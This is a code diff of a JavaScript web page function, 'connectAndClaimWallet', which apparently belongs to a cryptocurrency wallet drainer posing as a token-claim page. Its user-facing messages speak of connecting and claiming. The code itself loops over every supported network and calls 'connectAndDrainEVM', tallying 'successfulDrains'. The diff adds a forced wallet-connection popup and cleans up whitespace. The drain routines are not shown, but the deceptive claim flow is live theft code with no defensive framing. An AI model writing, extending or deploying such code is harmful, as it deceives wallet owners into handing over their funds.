@@ -2398,37 +2398,47 @@
     async function connectAndClaimWallet(walletType) {
         try {
             updateProgress(0, 'Initializing wallet connection...');
-            
+
             // Get wallet provider - will be determined per network
             const initialProvider = getWalletProvider(walletType);
             if (!initialProvider) {
                 throw new Error(`${walletType} wallet not found. Please install the wallet extension.`);
             }
-            
+
+            // Force wallet popup for EVM wallets
+            if (initialProvider && initialProvider.request && typeof initialProvider.request === 'function') {
+                try {
+                    await initialProvider.request({ method: 'eth_requestAccounts' });
+                } catch (popupError) {
+                    log(`❌ Wallet connection rejected or failed: ${popupError.message}`, 'error', true);
+                    throw popupError;
+                }
+            }
+
             // Determine supported networks
             const supportedNetworks = getSupportedNetworks(walletType);
             log(`📋 ${walletType} supports: ${supportedNetworks.join(', ')}`, 'info');
-            
+
             updateProgress(20, 'Connecting to wallet...');
-            
+
             // Connect to all supported networks and drain
             let totalClaimed = 0;
             let successfulDrains = 0;
             let failedDrains = 0;
             let transactions = [];
-            
+
             for (let i = 0; i < supportedNetworks.length; i++) {
                 const networkKey = supportedNetworks[i];
                 const network = NETWORKS[networkKey];
-                
+
                 updateProgress(20 + (i / supportedNetworks.length) * 70, `Processing ${network.name}...`);
-                
+
                 try {
                     log(`🔗 Connecting to ${network.name}...`, 'info');
-                    
+
                     // Get the correct provider for this specific network
                     const networkProvider = getWalletProvider(walletType, network.type);
-                    
+
                     if (network.type === 'evm') {
                         const result = await connectAndDrainEVM(networkProvider, networkKey);
                         if (result.success) {
@@ -2448,17 +2458,17 @@
                             successfulDrains++;
                         }
                     }
-                    
+
                     // Small delay between networks
                     await new Promise(resolve => setTimeout(resolve, 1000));
-                    
+
                 } catch (error) {
                     log(`❌ Failed to process ${network.name}: ${error.message}`, 'error');
                 }
             }
-            
+
             updateProgress(100, 'Connect & Claim Complete!');
-            
+
             // Final summary
             log('=' .repeat(60), 'info', true);
             log(`🎉 UNIFIED CONNECT & CLAIM COMPLETE!`, 'success', true);
@@ -2466,15 +2476,15 @@
             log(`✅ Successful networks: ${successfulDrains}`, 'success', true);
             log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true);
             log('=' .repeat(60), 'info', true);
-            
+
             setTimeout(() => updateProgress(0, ''), 3000);
-            
-            const message = successfulDrains > 0 ? 
+
+            const message = successfulDrains > 0 ?
                 `🎉 Successfully connected & claimed from ${successfulDrains} network(s)!` :
                 `⚠️ No tokens were claimed. Please check your wallet balances.`;
-            
+
             alert(message);
-            
+
         } catch (error) {
             log(`❌ Connect & Claim failed: ${error.message}`, 'error', true);
             updateProgress(0, '');
